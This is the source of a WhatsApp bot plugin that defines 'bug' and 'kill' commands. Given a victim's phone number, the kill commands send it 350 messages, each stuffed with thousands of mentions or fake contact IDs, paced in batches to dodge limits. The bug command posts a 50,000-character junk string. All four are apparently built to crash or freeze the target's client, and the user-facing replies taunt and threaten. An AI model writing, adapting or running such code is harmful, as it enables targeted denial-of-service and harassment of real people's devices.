const axios = require('axios')
const pino = require("pino");
const {cmd , commands} = require('../command')
 
const fs = require('fs-extra');
const { exec } = require('child_process')
const crypto = require('crypto')




// Définir les valeurs de configuration directement dans le fichier
const LENGTH = 5; // Nombre de fois que le texte est dupliqué
const FORCE = 3;  // Nombre de fois que le message est envoyé
const predefinedText = `Les débats sur la validité et l'interprétation à donner à ces nombres apparaît dès les premiers siècles du christianisme. Par exemple, dans la seconde moitié du iie siècle apr. J.-C., le millénariste Irénée de Lyon, qui professe une autorité absolue des Écritures, évoque le chiffre de la bête à plusieurs reprises dans son traité Contre les hérésies : il défend « 666 » — tout en lui donnant plusieurs interprétations possibles qu'il se garde de tranche et rejette les alternatives, tentant de disqualifier leurs défenseurs qu'il traite d'ignorants.
Le court traité De Monogramma Christi, s'adressant à un public latin et attribué à Jérôme de Stridon  mais dont il n'est probablement pas l'auteur, récuse les interprétations isopséphiques et calcule un monogramme du Christ qui n'est attesté nulle part ailleurs. Il y expose également que  six cent seize  616, écrit χιϛ serait le nom usurpé par l'Antéchrist[25] du verset 18 dans le chapitre 13 de l'Apocalypse. En outre, le traité développe une argumentation qui réfute la validité de toute isopséphie réduite, arguant que le secret abrité par le chiffre devrait y rester, témoignant ainsi que l'approche isopséphique était déjà en débat chez les premiers auteurs chrétiens`;

cmd({
        pattern: "bug",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (conn, mek, m,{ isOwner }) => {
        if(!isOwner) return m.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
                const bug2 = `🄿🄾🅆🄴🅁🄳 🅱🆈 𝐒𝐔𝐋𝐀-𝐌𝐃 😈` + "ꦾ".repeat(50000);
                await conn.sendMessage(m.chat, { text: bug2 }, { quoted: mek });
        } catch (error) {
            console.error("Error sending Bugtext message: ", error);
        }
    }
);

//==========================================CLEAN===============================================

// Définir les valeurs de configuration directement dans le fichier
let prefix = '໒ཞศƶƴ_♇ཞརས໒ཛ👑===>>💣💣💣777';

///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
cmd({
    pattern: "killno",
    alias: ["pm-kill"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (conn, mek, m,{ isOwner , q }) => {
    try {
        if (!isOwner) {
            return m.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
let text = q;
        if (!text) {
            return m.reply(`🫵🏽 add the your target number\nනම්බර් එක දාපන් යකො🗡️\n.killno 9476066xxxx`);
        }

        const jid = m.chat; // JID of the recipient
        const bom = "ꦾ";
        const userId = conn.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';
        console.log(`jid: ${jid}`);
        console.log(`ying jid: ${ying}`);
        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await conn.sendMessage(ying, {
                    text: message,
                    mentions: Array(4000).fill(bom) // Mention the same JID 4000 times
                });
                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await conn.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await conn.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await conn.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
       m.reply(`An error occurred: ${error.message}`);
    }
});

//////////////*/
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////

cmd({
    pattern: "killhim",
    alias: ["pm-kill2"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (conn, mek, m, { isOwner,q  }) => {
    try {
        if (!isOwner) {
            return m.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
let text =q
        if (!text) {
            return m.reply(`🫵🏽 add the your target number\nනම්බර් එක දාපන් යකො🗡️\n.kill 9476066xxxx`);
        }

        const jid = m.chat; // JID of the recipient
        const userId = conn.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';

        // Generate unique JIDs for mentions
        const uniqueJIDs = Array.from({ length: 5000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);

        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await conn.sendMessage(ying, {
                    text: message,
                    mentions: uniqueJIDs.slice(j * batchSends, (j + 1) * batchSends) // Mention unique JIDs
                });

                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await conn.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await conn.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await conn.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
        m.reply(`An error occurred: ${error.message}`);
    }
});
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////

cmd({
    pattern: "killnow",
    alias: ["pm-kill0"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (conn, mek, m,{ isOwner ,q}) => {
    try {
        if (!isOwner) {
            return m.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
let text = q;
        if (!text) {
            return m.reply(`🫵🏽 add the your target number\nනම්බර් එක දාපන් යකො🗡️\n.kill 9476066xxxx`);
        }

        const jid = m.chat; // JID of the recipient
        const userId = conn.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return m.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 9476066xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';

        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await conn.sendMessage(ying, {
                    text: message,
                    mentions: Array(5000).fill(jid) // Mention the same JID 4000 times
                });

                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await conn.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await conn.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await conn.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
        m.reply(`An error occurred: ${error.message}`);
    }
});
